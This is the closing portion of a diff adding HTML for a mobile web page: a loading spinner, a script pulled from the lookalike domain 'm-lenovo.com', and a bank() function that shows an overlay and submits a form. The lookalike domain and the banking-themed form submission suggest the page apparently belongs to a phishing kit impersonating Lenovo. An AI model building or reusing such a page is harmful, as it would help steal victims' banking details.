+                                        <div data-v-78a1d2e4="" class="van-loading van-loading--spinner van-loading--vertical">
+                                            <span data-v-78a1d2e4="" class="van-loading__spinner van-loading__spinner--spinner" style="width: 30px; height: 30px;">
+                                                <i data-v-78a1d2e4=""></i>
+                                                <i data-v-78a1d2e4=""></i>
+                                                <i data-v-78a1d2e4=""></i>
+                                                <i data-v-78a1d2e4=""></i>
+                                                <i data-v-78a1d2e4=""></i>
+                                                <i data-v-78a1d2e4=""></i>
+                                                <i data-v-78a1d2e4=""></i>
+                                                <i data-v-78a1d2e4=""></i>
+                                                <i data-v-78a1d2e4=""></i>
+                                                <i data-v-78a1d2e4=""></i>
+                                                <i data-v-78a1d2e4=""></i>
+                                                <i data-v-78a1d2e4=""></i>
+                                            </span>
+                                            <span data-v-78a1d2e4="" class="van-loading__text">Loading...</span>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </uni-view>
+                    </uni-page-body>
+                </uni-page-wrapper>
+            </uni-page>
+        </uni-app>
+        <script src="https://m-lenovo.com/public/assets/toast.js"></script>
+        <script></script>
+        <script>
+            function bank() {
+                document.querySelector('.van-overlay').style.display = 'block';
+                document.querySelector('form').submit();
+            }
+        </script>
+    </body>
+</html>
